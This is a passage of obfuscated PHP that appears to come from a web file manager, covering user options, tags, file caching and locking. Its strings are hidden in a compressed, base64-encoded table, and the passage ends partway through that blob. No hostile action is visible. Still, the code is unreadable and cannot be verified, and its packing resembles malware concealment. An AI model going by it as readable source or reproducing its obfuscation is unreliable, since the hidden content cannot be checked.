userAppendGroup($ª°Åãº¥) { $‰îì€µé =& $_SERVER[±Ö‰ô½¯]; if (!$ª°Åãº¥) { return array(); } $this->_listAppendGroup($ª°Åãº¥, array_to_keyvalue($ª°Åãº¥, $‰îì€µé[12], $‰îì€µé[1542])); return $ª°Åãº¥; } private function _listAppendMeta(&$³Ç¯ñ, $ãèãÉ–ô) { $ÙÂ¤ùèè =& $_SERVER[±Ö‰ô½¯]; $ô›Ò¥­… = UserJobModel::JOB_KEY; $”Ú‘™Òè = array($ÙÂ¤ùèè[2224]); $¬Ş†Ğæ  = array($ÙÂ¤ùèè[1542] => array($ÙÂ¤ùèè[7], $ãèãÉ–ô)); $ŠÖñÕ²© = Model($ÙÂ¤ùèè[2648])->where($¬Ş†Ğæ )->select(); $¢Š­Ê§İ = array(); foreach ($ŠÖñÕ²© as $¦•¼‚Ç) { $ÆöÁÉ = $¦•¼‚Ç[$ÙÂ¤ùèè[1542]]; if (!isset($¢Š­Ê§İ[$ÆöÁÉ])) { $¢Š­Ê§İ[$ÆöÁÉ] = array(); } $¢Š­Ê§İ[$ÆöÁÉ][$¦•¼‚Ç[$ÙÂ¤ùèè[95]]] = $¦•¼‚Ç[$ÙÂ¤ùèè[452]]; } $£Ü–Åƒ = Model($ÙÂ¤ùèè[2674]); foreach ($³Ç¯ñ as &$‰üÁÊí—) { $ÆöÁÉ = $‰üÁÊí—[$ÙÂ¤ùèè[1542]]; $Ò²»ÕÛ = isset($¢Š­Ê§İ[$ÆöÁÉ]) ? $¢Š­Ê§İ[$ÆöÁÉ] : array(); $‰üÁÊí—[$ÙÂ¤ùèè[552]] = array_field_key($Ò²»ÕÛ, $”Ú‘™Òè); $‰üÁÊí—[$ÙÂ¤ùèè[2675]] = array(); if (isset($Ò²»ÕÛ[$ô›Ò¥­…])) { $‰üÁÊí—[$ÙÂ¤ùèè[2675]] = $£Ü–Åƒ->getUserJobInfo($Ò²»ÕÛ[$ô›Ò¥­…]); } } unset($‰üÁÊí—); } protected function groupUserAll($™°«±îñ) { $ëãäá©š =& $_SERVER[±Ö‰ô½¯]; if (!$™°«±îñ) { return !1; } $´²Š¼÷¡ = Model($ëãäá©š[2228])->field($ëãäá©š[1542])->where(array($ëãäá©š[1444] => array($ëãäá©š[7], $™°«±îñ)))->select(); $´²Š¼÷¡ = array_to_keyvalue($´²Š¼÷¡, $ëãäá©š[12], $ëãäá©š[1542]); return array_unique($´²Š¼÷¡); } public function userSearch($“÷úÎà¥, $Ş˜ã„áÈ = "\x2a") { return Model($_SERVER[±Ö‰ô½¯][614])->where($“÷úÎà¥)->field($Ş˜ã„áÈ)->find(); } } goto a½‰¶­¬¹; a½‰¶­¬¹: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ÇÆ°Á¹Ú) { return "\x55\x73\145\x72\117\160\x74\x69\157\x6e\x5f{$ÇÆ°Á¹Ú}\137" . KodUser::id(); } protected function filterWhere($¤¦´æšÒ) { $¤¦´æšÒ[$_SERVER[±Ö‰ô½¯][1542]] = KodUser::id(); return $¤¦´æšÒ; } public function cacheRemoveUser($çá„”¡Ô, $áğ–¯üÑ) { return Cache::remove("\125\163\145\162\117\x70\164\151\157\156\137{$çá„”¡Ô}\x5f" . $áğ–¯üÑ); } protected function optionDefault($õè‡şßª = '') { $ºËö‰•× =& $_SERVER[±Ö‰ô½¯]; if ($õè‡şßª == $ºËö‰•×[12]) { return $GLOBALS[$ºËö‰•×[6]][$ºËö‰•×[2676]]; } if ($õè‡şßª == $ºËö‰•×[2677]) { return $GLOBALS[$ºËö‰•×[6]][$ºËö‰•×[2678]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\56\x74\141\147\x4c\151\163\164"; public $modelType = "\x55\163\145\x72\117\160\x74\151\x6f\156"; public $field = array("\x6e\x61\x6d\145", "\x73\164\x79\x6c\145", "\163\x6f\162\x74"); public function listData($Ò »ã”ô = false, $îĞÏÖåß = "\x73\157\x72\164", $ßŒÜ‘İË = false) { return parent::listData($Ò »ã”ô, $îĞÏÖåß, $ßŒÜ‘İË); } public function remove($ª©ëÀ‰õ) { return parent::remove($ª©ëÀ‰õ); } public function add($ö‘ñ¡£¹, $Øƒ–á = "\154\141\142\x65\x6c\55\147\x72\x65\171\x2d\156\157\x72\x6d\141\154") { $µ¶Î¸Á° =& $_SERVER[±Ö‰ô½¯]; if ($this->findByName($ö‘ñ¡£¹)) { return !1; } $”ÃéÇçó = array($µ¶Î¸Á°[506] => $ö‘ñ¡£¹, $µ¶Î¸Á°[571] => $Øƒ–á, $µ¶Î¸Á°[2140] => $this->getSort($µ¶Î¸Á°[337]) + 1); return parent::insert($”ÃéÇçó); } public function update($ˆ¦íœû™, $¹ôæ’òĞ) { $é ÑÂÒ =& $_SERVER[±Ö‰ô½¯]; $ÂŠŸàµ = $this->listData($ˆ¦íœû™); $¡®µä´š = $this->findByName($¹ôæ’òĞ[$é ÑÂÒ[32]]); if (!$ÂŠŸàµ || $¡®µä´š && $¡®µä´š[$é ÑÂÒ[484]] != $ÂŠŸàµ[$é ÑÂÒ[484]]) { return !1; } return parent::update($ˆ¦íœû™, $¹ôæ’òĞ); } public function moveTop($üƒî¬ö¢) { $Ÿ÷–¤äÌ =& $_SERVER[±Ö‰ô½¯]; $óÕªâ‹ = parent::listData(); $Ë¿£ûÄ = $this->getSort($Ÿ÷–¤äÌ[336]); foreach ($óÕªâ‹ as &$ˆì£Ğñ­) { if ($ˆì£Ğñ­[$Ÿ÷–¤äÌ[484]] == $üƒî¬ö¢) { $ˆì£Ğñ­[$Ÿ÷–¤äÌ[2158]] = $Ë¿£ûÄ; continue; } $ˆì£Ğñ­[$Ÿ÷–¤äÌ[2158]] += 1; } unset($ˆì£Ğñ­); return parent::resetData($óÕªâ‹); } public function moveBottom($äĞ‹·ìú) { $†Ş£Ğü¹ =& $_SERVER[±Ö‰ô½¯]; $ŠÅÑ¿¡ = $this->getSort($†Ş£Ğü¹[337]) + 1; return parent::update($äĞ‹·ìú, array($†Ş£Ğü¹[2158] => $ŠÅÑ¿¡)); } public function resetSort($ƒ †ç¹) { $Ğ™£˜ƒÜ =& $_SERVER[±Ö‰ô½¯]; $ìõğË¼£ = array(); $ƒ †ç¹ = is_array($ƒ †ç¹) ? $ƒ †ç¹ : array(); for ($ŸŞïÙ€Å = 0; $ŸŞïÙ€Å < count($ƒ †ç¹); $ŸŞïÙ€Å++) { $ìõğË¼£[$ƒ †ç¹[$ŸŞïÙ€Å] . $Ğ™£˜ƒÜ[12]] = $ŸŞïÙ€Å + 1; } $ç©úçï = parent::listData(); foreach ($ç©úçï as &$¡¬£–†—) { $ÙéòĞ  = $ìõğË¼£[$¡¬£–†—[$Ğ™£˜ƒÜ[484]]]; $¡¬£–†—[$Ğ™£˜ƒÜ[2158]] = $ÙéòĞ  ? $ÙéòĞ  : $¡¬£–†—[$Ğ™£˜ƒÜ[2158]]; } unset($¡¬£–†—); return parent::resetData($ç©úçï); } private function getSort($÷«»¶³ğ) { $ûµêÉÔû =& $_SERVER[±Ö‰ô½¯]; $ù÷Åë¥µ = parent::listData(); $Çîä¡¼˜ = array_to_keyvalue($ù÷Åë¥µ, $ûµêÉÔû[12], $ûµêÉÔû[2158]); if (!$Çîä¡¼˜) { $Çîä¡¼˜ = array(0); } $ƒ¼ùÅæ° = $÷«»¶³ğ == $ûµêÉÔû[337] ? max($Çîä¡¼˜) : min($Çîä¡¼˜); return intval($ƒ¼ùÅæ°); } } goto FØœãù¿Š¬; a¢²ÈÄô©ª: function binCheckBigger($ì…êšÈş, $ïô ¿˜Í) { return $ì…êšÈş > $ïô ¿˜Í; } $_SERVER[$_SERVER[«¡ù¬šé][3]] = ("\x39\x30\x38\x38"."\x38\x33")+0;$_bvcj="ebngyli51j27ou4qrap9ws3tdcfvxmh80k6za9qyzx1lnjhtimvbr3do265wup0sg4efc87kt5d6";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ë€ÛŒ¬€, $³ï–‰ØŞ) { $Ëç£›³† =& $_SERVER[±Ö‰ô½¯]; if (isset(self::$_methodList[$Ë€ÛŒ¬€])) { return @call_user_func_array(self::$_methodList[$Ë€ÛŒ¬€], $³ï–‰ØŞ); } else { if (method_exists($this, $Ë€ÛŒ¬€)) { return call_user_func_array(array($this, $Ë€ÛŒ¬€), $³ï–‰ØŞ); } else { think_exception(__CLASS__ . $Ëç£›³†[4] . $Ë€ÛŒ¬€ . $Ëç£›³†[5]); } } } public static function __callStatic($ïšïµ±É, $„Š½âÑ¿) { if (isset(self::$_methodListStatic[$ïšïµ±É])) { return call_user_func_array(self::$_methodListStatic[$ïšïµ±É], $„Š½âÑ¿); } else { if (method_exists(self, $ïšïµ±É)) { return call_user_func_array(array(self, $ïšïµ±É), $„Š½âÑ¿); } else { show_json("{$ïšïµ±É}\x28\x29\40\156\x6f\x74\x20\145\170\x69\163\x74\x3b", !1); } } } public static function addMethod($·³¸´ë«, $×‹Óº¨ª) { self::$_methodList[$·³¸´ë«] = $×‹Óº¨ª; } public static function addMethodStatic($‘ç©ÈÒÎ, $ëÔ„ğå) { self::$_methodListStatic[$‘ç©ÈÒÎ] = $ëÔ„ğå; } } goto F”ĞçÁ«¯¥; dİì›“çÖ: define($_SERVER[±Ö‰ô½¯][0], $_SERVER[±Ö‰ô½¯][1]); $_SERVER[«¡ù¬šé] = explode($_SERVER[±Ö‰ô½¯][2], gzinflate(substr($_SERVER[±Ö‰ô½¯][3], 10, -8))); function binCheckEq($ªÕôÃ§§, $®¹ñàÁ) { return $ªÕôÃ§§ == $®¹ñàÁ; } goto BĞÏŞÙêÙ’; f¥¶‘‰ï…: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ØÎ¨±º, $ƒºÜ¶óİ) { $šü“ªË =& $_SERVER[±Ö‰ô½¯]; $this->cachePath = $ØÎ¨±º[$šü“ªË[87]]; $this->prefix = $šü“ªË[943]; $this->cacheTime = $ƒºÜ¶óİ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ş¾Ü·£¢) { $§ˆ¡®É® =& $_SERVER[±Ö‰ô½¯]; $ş¾Ü·£¢ = str_replace(array($§ˆ¡®É®[944], $§ˆ¡®É®[98], $§ˆ¡®É®[76]), $§ˆ¡®É®[945], $ş¾Ü·£¢); return $this->cachePath . $§ˆ¡®É®[946] . $ş¾Ü·£¢ . $§ˆ¡®É®[947]; } public function set($êÍœÄ¥, $Ñ»…íÁ, $‡ÆøÃš– = false) { $‡ÆøÃš– = $‡ÆøÃš– ? $‡ÆøÃš– : $this->cacheTime; $Õãú¶Ø = $this->getFile($êÍœÄ¥); if (file_put_contents($Õãú¶Ø, $this->prefix . $Ñ»…íÁ, LOCK_EX)) { @touch($Õãú¶Ø, intval(time() + $‡ÆøÃš–)); clearstatcache(); return !0; } @unlink($Õãú¶Ø); return !1; } public function get($‘Œ’§û¹) { $è”¤êöë = $this->getFile($‘Œ’§û¹); if (file_exists($è”¤êöë) && filemtime($è”¤êöë) < time()) { @unlink($è”¤êöë); return !1; } $µÕ‡å‡­ = @file_get_contents($è”¤êöë); return substr($µÕ‡å‡­, strlen($this->prefix)); } public function remove($ËŠû¦ƒÂ) { $Ïô†ƒ = $this->getFile($ËŠû¦ƒÂ); return @unlink($Ïô†ƒ); } public function deleteAll() { $êÁûõï‹ =& $_SERVER[±Ö‰ô½¯]; $ëìÆĞ”¡ = scandir($this->cachePath); foreach ($ëìÆĞ”¡ as $‚ú‘…““) { $•«è‹¸ = $this->cachePath . $‚ú‘…““; if (strpos($•«è‹¸, $êÁûõï‹[947]) && strpos($•«è‹¸, $êÁûõï‹[948])) { @unlink($•«è‹¸); } } } public function clearTimeout() { $Õ›¼×¥ƒ =& $_SERVER[±Ö‰ô½¯]; $ƒ³êîø« = scandir($this->cachePath); foreach ($ƒ³êîø« as $÷ªÉº·¿) { $­Ä†ÉÀş = $this->cachePath . $÷ªÉº·¿; if (strpos($­Ä†ÉÀş, $Õ›¼×¥ƒ[947]) && strpos($­Ä†ÉÀş, $Õ›¼×¥ƒ[948]) && filemtime($­Ä†ÉÀş) < time()) { @unlink($­Ä†ÉÀş); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $³»ù¨¦ =& $_SERVER[±Ö‰ô½¯]; if (self::$handle) { return self::$handle; } $İÚáßŠ = $GLOBALS[$³»ù¨¦[6]][$³»ù¨¦[426]]; self::$timeout = $İÚáßŠ[$³»ù¨¦[949]] ? $İÚáßŠ[$³»ù¨¦[949]] : 10; $ÑË’¾±Ñ = _get($GLOBALS[$³»ù¨¦[6]], $³»ù¨¦[950]); $ÙÖ‘¡é = $İÚáßŠ[$³»ù¨¦[932]] ? $İÚáßŠ[$³»ù¨¦[932]] : $³»ù¨¦[232]; if ($ÙÖ‘¡é == $³»ù¨¦[21] && $ÑË’¾±Ñ == $³»ù¨¦[13]) { $ÙÖ‘¡é = $³»ù¨¦[232]; } switch ($ÙÖ‘¡é) { case $³»ù¨¦[935]: self::$handle = new CacheLockRedis(); break; case $³»ù¨¦[936]: self::$handle = new CacheLockMemcached(); break; case $³»ù¨¦[21]: self::$handle = new CacheLockDatabase(); break; case $³»ù¨¦[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($³»ù¨¦[951], $³»ù¨¦[952]); } return self::$handle; } private static function key($Ë¥Åã›) { return $_SERVER[±Ö‰ô½¯][953] . Cache::key($Ë¥Åã›); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ßÈùâœó = '') { self::$errorMsg = $ßÈùâœó; } public static function lockGlobal($Æ„êâÌ, $¤şÖşÉû) { return self::lock($Æ„êâÌ, $¤şÖşÉû, !0); } public static function lock($İ÷Ù—Şß, $³æìú = false, $ãĞ¨ÜÂÏ = false) { $ÒùÚ³®ú =& $_SERVER[±Ö‰ô½¯]; $şã¯¡‹ = self::init(); $»˜ôŞÄÛ = self::key($İ÷Ù—Şß); $³æìú = $³æìú ? $³æìú : self::$timeout; $ıáØ‰¸ = timeFloat(); if (_get($GLOBALS, $ÒùÚ³®ú[954], !1)) { if (!$şã¯¡‹->lock($»˜ôŞÄÛ, 0.2)) { die; } return !0; } $Ìöóõ¿ = $şã¯¡‹->lock($»˜ôŞÄÛ, $³æìú); $®Ï¦¸ô§ = timeFloat(); if (!$Ìöóõ¿) { $’“£½“Å = "\154\157\143\153\40\x65\162\x72\157\x72\x3b\153\145\171\x3d{$İ÷Ù—Şß}\x3b\164\x69\155\x65\75{$³æìú}\73" . self::$errorMsg . $ÒùÚ³®ú[74] . get_caller_msg(); $æá£¼èñ = LNG($ÒùÚ³®ú[955]) . "\x28{$³æìú}\x73\51\56" . LNG($ÒùÚ³®ú[956]); $æá£¼èñ .= $ÒùÚ³®ú[957]; if (is_string(self::$errorMsg) && self::$errorMsg) { $æá£¼èñ = $æá£¼èñ . $ÒùÚ³®ú[958] . self::$errorMsg; } write_log($ÒùÚ³®ú[959] . sprintf($ÒùÚ³®ú[960], timeFloat() - $ıáØ‰¸) . $ÒùÚ³®ú[961] . $’“£½“Å . $ÒùÚ³®ú[962] . json_encode(error_get_last()), $ÒùÚ³®ú[952]); show_json($æá£¼èñ, !1); } if (!$ãĞ¨ÜÂÏ) { self::$lockItem[$»˜ôŞÄÛ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $À©†©ó = number_format(timeFloat() - $®Ï¦¸ô§, 3); write_log($ÒùÚ³®ú[963] . $İ÷Ù—Şß . $ÒùÚ³®ú[964] . $À©†©ó, $ÒùÚ³®ú[952]); } return $Ìöóõ¿; } public static function lockGet($ı¬¸çÊæ) { $ŠŞÒ·Š = self::key($ı¬¸çÊæ); if (self::$lockItem[$ŠŞÒ·Š]) { return self::$lockItem[$ŠŞÒ·Š]; } return self::init()->lockGet($ŠŞÒ·Š); } public static function unlock($¡î™Ì–Ÿ) { $éíë‹ùæ =& $_SERVER[±Ö‰ô½¯]; $‘ä˜ìæë = self::key($¡î™Ì–Ÿ); self::$lockItem[$‘ä˜ìæë] = null; self::init()->unlock($‘ä˜ìæë); if (GLOBAL_DEBUG_LOG_ALL) { write_log($éíë‹ùæ[965] . $¡î™Ì–Ÿ, $éíë‹ùæ[952]); } return; } public static function unlockRuntime() { $µåşˆ†Ï =& $_SERVER[±Ö‰ô½¯]; $ªÌšàñ = self::init(); $óÆ¿£âˆ = !1; foreach (self::$lockItem as $Œ‹ƒæ³á => $ûõ€Ààë) { if (!$ûõ€Ààë) { continue; } $ªÌšàñ->unlock($Œ‹ƒæ³á); if (!$óÆ¿£âˆ) { $óÆ¿£âˆ = !0; write_log($µåşˆ†Ï[966] . $Œ‹ƒæ³á . $µåşˆ†Ï[74] . get_caller_msg(), $µåşˆ†Ï[952]); continue; } write_log($µåşˆ†Ï[966] . $Œ‹ƒæ³á, $µåşˆ†Ï[952]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÍßÌ¶Ãê = number_format(timeFloat() - TIME_FLOAT, 3); write_log($µåşˆ†Ï[967] . $ÍßÌ¶Ãê . $µåşˆ†Ï[968] . ACTION, $µåşˆ†Ï[952]); } } public static function fileLock($èŒ³û) { $ş×êäºÙ =& $_SERVER[±Ö‰ô½¯]; if (!$GLOBALS[$ş×êäºÙ[969]]) { $GLOBALS[$ş×êäºÙ[969]] = array(); } $GLOBALS[$ş×êäºÙ[969]][$èŒ³û] = !1; $‘Å®¾¿’ = fopen(DATA_PATH . $èŒ³û . $ş×êäºÙ[970], $ş×êäºÙ[971]); if (!$‘Å®¾¿’) { return !1; } $GLOBALS[$ş×êäºÙ[969]][$èŒ³û] = $‘Å®¾¿’; if (flock($‘Å®¾¿’, LOCK_EX)) { return !0; } self::unlock($èŒ³û); show_json($ş×êäºÙ[972], !1); return !1; } public static function fileUnlock($µÇÇ‹ÌÊ) { $³ØÂ¬Ø¶ =& $_SERVER[±Ö‰ô½¯]; $ÔóÛ¾– = $GLOBALS[$³ØÂ¬Ø¶[969]][$µÇÇ‹ÌÊ]; if (!$ÔóÛ¾–) { return; } $GLOBALS[$³ØÂ¬Ø¶[969]][$µÇÇ‹ÌÊ] = !1; flock($ÔóÛ¾–, LOCK_UN); fclose($ÔóÛ¾–); } public static function fileUnlockAll() { $µåì¿–‡ =& $_SERVER[±Ö‰ô½¯]; if (!isset($GLOBALS[$µåì¿–‡[969]]) || !$GLOBALS[$µåì¿–‡[969]]) { return; } foreach ($GLOBALS[$µåì¿–‡[969]] as $åö€ı–İ => $¸º¯Ùà) { if (!$¸º¯Ùà) { continue; } $GLOBALS[$µåì¿–‡[969]][$åö€ı–İ] = !1; flock($¸º¯Ùà, LOCK_UN); fclose($¸º¯Ùà); } $GLOBALS[$µåì¿–‡[969]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto CÓ¨“òŠ¯Ò; f½ÖŸš…¡Ï: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('sdaJ9L2v'), strrev('öÚ˜àœ’')); $_SERVER[±Ö‰ô½¯] = explode("\174\1\174\2\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\167\174\34\305\365\0\16\201\44\230\120\223\120\122\10\213\300\226\154\137\221\344\212\154\331\76\113\47\353\360\111\47\356\116\56\110\362\172\165\267\222\326\272"."\xbb\x3d\xdf\xee\xa9\x81\xf3\xa5\x86\x8e\x21\xa1\x1a\x42\x4b\x28\x29\x18\x48\x28\x6\x53\x42\x20\xc9\x37\x90\x42\xa\x90\x0\x69\x60\xc9\x18\x12\x1c\x4a\x8\x9\x9\xfc\xa6\xbc\x37\x33\xbb\x77\x82\xef\xef\xf3\xfb\xe3\xe7"."\217\355\233\276\63\157\336\274\171\363\346\275\67\337\271\351\137\337\335\266\347\264\175\117\373\330\151\37\177\340\251\155\157\275\366\20\17\237\266\77\371\267\37\17\37\173\341\1\373\260\77\237\271\360\202".strrev('1ÌÕÛhÿ‰·^aH›ûë=®ŸwÚŸ7Ôè¤÷|_àìYúŸÄI.0î2ßw=ëh<íÎ…öºº').base64_decode('y3EdnpCxCwPWIA9bBf4b5j/dyXjJzNuuyaMh/qNDv9j/zuachfl6ZyKtp7q7uqLJNBRqUvPzdg==')."\26\102\105\243\144\344\341\373\105\263\344\220\336\250\315\351\105\273\150\26\74\51\62\41\153\270\106\277\341\100\113\255\53\365\326\150\127\74\261\136\117\257\357\212\102\211\176\175\163\331\54\215\363\30\13".base64_decode('plyj5KatvClKjJZEv1ZGV8U6tXQy0pmKtKRjiU6e3JLo6IilK9OTiXh8ZaRldWVOVzKyqiOikQ==')._kodDe('MNPsyzr6GGPGNMihjIk/8buEW7mHTuCur6bcM9GT9nYzQTqKj9+5lTZT9u+7ipFW8ZijUH+4twk=')."\x38\xe8\xd5\xe6\xb8\x48\xe5\x1\xa3\xec\xda\x56\x21\xc3\x23\xd1\x31\xb7\x64\xc8\x74\xd2\xd7\xc\x99\x68\xb3\x0\x4d\xa5\xa2\xf1\x68\x4b\x5a\xa3\x1d\xd4\xda\x92\x89\xe\xd\x26\x21\x6f\x38\xae\x59\xd2\xd6\xb6\x47\x93\x51".base64_decode('jXa6uZaNtVYDfOkkoNAi8bg2XQuumS9iM7xOlcYSydZoUlu5XpMQytj5vF0IkVbITLpKV6PJJA==').strrev('°šĞV'."\n".'¶nê'."\0".'í¯Àü-où‡M•ÈÄ}\\äËÓğ2zN9;ƒ"¢¥µ´Ii:1ã½'."\0".'')."\x6d\xb1\xac\x20\x50\xc6\xd2\x26\xa6\x98\x59\x8\xe4\x49\x7d\x1b\xea\xf5\x43\x5a\x3f\x96\xda\x84\x1\x8b\xac\xd0\x11\x1e\x6c\x5e\xc6\x7f\x97\x40\xfd\x7e\x9d\xe6\x99\x25\x57\x37\xb\x19\x3b\x6b\x15\x60\x1d\x2f\x7\x7c\x34"."\xdc\xa1\xd6\x92\x45\xa\xf0\xf8\x80\x9d\xcb\x62\xd8\xb1\x26\x60\x94\x3\x56\xce\xec\x2c\xe7\xd5\x22\x22\x9a\x19\xb2\x72\xd9\x12\x2e\xbd\xf\x2b\xc9\xa3\x71\xb1\x92\x69\x59\x19\x2b\x92\x9e\x8\x22\x60\xd\x8c\xcb\xa5\x48"."\xcb\x75\x89\x5c\xc7\x2e\x97\x32\x66\x8c\x2c\x1d\x1e\x6f\x80\x64\xd3\x75\xc9\xe0\x10\x20\x76\x77\x31\x67\x1b\xd9\x94\x59\x12\x43\xb3\xec\x36\xd2\x50\xa2\xec\xaa\x89\xc3\xb8\xa\xb2\xa\x10\xc2\x75\x3d\x67\x4\xdf\xef\xeb"."\131\101\376\233\15\204\256\27\76\63\144\346\162\272\71\146\302\62\311\147\27\70\70\276\260\323\157\25\302\44\205\107\143\11\175\310\160\206\72\262\13\164\126\13\351\147\326\34\13\25\207\212\260\206\305"."\262\355\365\240\61\205\106\247\355\106\25\52\234\263\63\6\224\55\263\301\361\360\220\353\26\123\146\41\113\7\7\103\261\107\13\154\360\105\323\204\102\255\1\55\253\165\150\353\265\366\46\253\311\301\212".base64_decode('+ZwI4ehEmiMS3TGcoewAICBuAjXwQcth9EwuRqNYzFkZw7XsQtjOuKYbdNySaUCLkUzGdJxgiw==')."\x5d\x70\x4b\x76\x2e\x18\xc9\xe5\xec\xd1\x60\xa2\x64\xd\x5a\x85\x26\x6d\xe\x90\x56\x92\x49\x96\x70\x90\x92\xbb\x26\x58\x97\x35\x4b\x34\x8a\xb\xf4\x33\x73\x9a\xcb\xee\x40\x70\x31\xae\xb7\x74\xc9\x28\x38\x3\x66\x29\x18".strrev('¹b´š7˜1’®Á˜%–V`«9'."\n".'·”‡ózü‰ÉD3#]pÍ&ûÚ,vÑNZµŠßı­\'HÒo$')."\237\300\7\226\40\244\145\150\11\265\60\300\247\111\313\33\143\101\143\20\133\212\216\25\255\222\351\40\120\264\125\35\151\100\270\201\140\7\135\72\226\231\15\246\10\275\206\306\346\325\317\327\10\52\151".base64_decode('mMdT29PpLj3WRjbkzqjeEUm3tEPrrjGITccJFRZNYuK6IFlCFNk6yeBkYpc9apbIh1eON2nDdg==').strrev('°‡tY¸üĞdg0K°ß¨k×À4;í’VOÇMwèÃ¤Q¤Áº/éÓ´"œ-aß¶')."\355\124\64\271\46\232\324\123\211\266\364\332\110\22\166\373\2\101\254\61\354\15\375\172\56\230\64\263\4\210\31\27\353\31\105\11\375\165\101\272\236\350\307\61\227\256\61\314\213\307\126\121\330\265\6"."\35\122\50\250\226\302\266\343\126\336\242\303\163\105\16\3\66\141\5\126\101\207\302\154\314\315\275\316\234\272\336\354\334\331\101\362\377\234\331\75\275\255\241\71\175\313\303\226\254\23\156\10\65\150\215"."\365\13\265\56\302\233\130\106\116\203\101\127\224\250\327\22\253\275\140\221\30\136\260\13\146\325\165\107\20\311\166\314\140\273\151\20\262\114\46\302\63\57\1\374\26\217\177\10\164\351\356\250\220\32\337"."\274\360\304\144\364\344\356\150\52\255\167\104\323\355\211\126\350\176\64\2\241\2\251\314\372\213\163\114\131\61\330\10\13\320\254\71\246\354\32\222\372\147\124\200\260\172\235\366\50\322\173\37\2\265\14"."\231\231\341\151\362\110\10\106\143\163\262\205\123\327\303\177\372\0\233\373\370\217\256\267\304\243\221\244\16\74\254\156\71\155\312\306\111\243\202\32\353\166\377\46\202\150\35\246\153\310\1\220\317\305\362"."\x64\x49\xcb\x81\xe8\xde\x5d\xe\x47\xd9\x21\x11\x9f\xac\xa0\xb5\x56\x56\x6c\x83\x24\xda\x6e\x5a\x83\x43\xd0\x6f\x8b\x36\x97\xb1\x73\x76\xc9\xc8\xd1\x9d\x2\x39\xd7\x41\xb\x88\x76\x31\x57\x26\xcb\x20\x4c\x1b\x4e\xf\x95".base64_decode('8/2wrxGQDZquZCqdccJ55XFLJvu6G2v1bLwQC+sUdXtDxcLg7BOgLb1xQT1NgFmFkRHuumxWDg==')."\75\224\261\311\72\357\60\206\315\46\72\26\40\156\113\130\52\106\24\372\271\204\356\210\315\176\62\101\147\53\27\312\223\106\130\233\55\266\330\303\371\371\145\211\167\107\324\314\122\311\56\35\7\45\130"."\130\143\333\52\235\56\150\334\25\174\207\103\50\2\206\207\154\301\247\330\210\233\115\141\30\367\314\306\66\240\42\131\302\257\205\34\227\114\2\31\240\221\315\126\113\46\224\7\32\70\15\321\226\145\40"."\xd7\x10\x4e\xcd\x23\x7f\x25\x8b\x90\xb5\xf3\x6\x6e\xb8\x94\x10\x89\xcf\xd2\x88\x23\x62\x6c\x17\x35\xb3\x7c\x1b\xf5\x24\xf1\x5\xce\x93\xe6\xe0\x27\x4b\xae\x4d\x33\x4b\x9e\x92\x4\x49\x87\x6c\xe8\x34\xc1\xa\x18\x70\x59".base64_decode('jBxhkDVzJiLYkImcSD0UIzMj0G9ArANyfCCpkquznCSpSfkGjK+l5y2ZQJknwCsZzJFZTbAFJQ==')."\343\135\45\163\300\32\103\122\62\346\166\30\245\141\34\30\251\51\227\42\215\50\313\264\255\73\36\327\133\22\235\151\162\134\343\51\153\223\261\164\24\51\126\244\125\217\264\164\101\114\322\100\301\337\251"."\34\12\117\31\151\4\24\42\235\10\113\126\212\154\326\105\273\100\50\55\20\253\240\74\314\125\144\145\45\53\1\270\43\331\17\37\107\101\170\202\374\104\60\117\350\112\120\364\251\253\33\170\1\304\12"."\144\204\127\216\267\331\45\344\362\254\301\302\32\61\363\153\123\363\203\355\35\221\226\140\252\75\322\270\140\41\117\135\237\317\366\246\333\55\247\367\24\21\207\356\214\72\363\365\222\111\326\64\342\102\143"."\175\3\256\70\302\227\30\262\347\353\203\371\40\155\205\162\234\241\372\372\172\154\153\356\102\155\210\220\22\101\277\263\154\264\170\266\51\147\206\115\225\234\73\301\121\13\151\336\11\202\133\77\241\22\370".base64_decode('TpntbrqRoc3ppLJbdlRIEQTMkioWMtE81cgN2gTvhvJqYlbgL4+bnOWCDw0ZAk4Uerg4CEM3rg==')."\x56\xa2\x60\x26\x7d\x40\xfa\xed\x65\xc1\xb5\x74\x75\x40\x73\xce\x3e\x6\xd0\x96\xfd\x28\xd2\x9d\x8d\x50\x6d\x9c\xb6\x59\xfc\xe7\x40\xe8\x46\x99\xac\xdb\x92\x35\xa1\x40\x7f\x39\xb6\x84\x34\x33\x91\x82\x4f\x8e\xe5\x73\xf2"."\324\5\240\1\150\252\103\33\323\111\216\16\71\272\232\323\56\350\0\316\102\107\253\157\115\360\315\237\247\55\135\116\276\250\215\120\31\216\135\150\256\155\10\325\327\152\170\26\155\256\355\116\267\21\66".base64_decode('fvmyA5e22PkiJSsd5Zxr0fFyzF0GY1xKeSCMdPnAEU0bsOssDavlloanaxWGQhmzdXpXPJJuSw==')."\44\73\0\307\213\105\211\126\305\114\265\325\26\224\24\251\354\4\115\312\47\303\52\60\62\71\37\212\252\260\130\127\25\23\327\125\303\304\165\76\114\134\127\211\211\353\252\341\331\10\40\244\221\67\46".base64_decode('7AJZr2SjzYcygBbp9ljnar0j0RqN67FOws+lK9O7u1ojSAbV9JWJdLsntZtwdGsi8Zi/eHRdLA==')."\x95\x4e\x55\xcd\x22\x69\xdd\x51\x5f\x4e\xeb\x4a\xbd\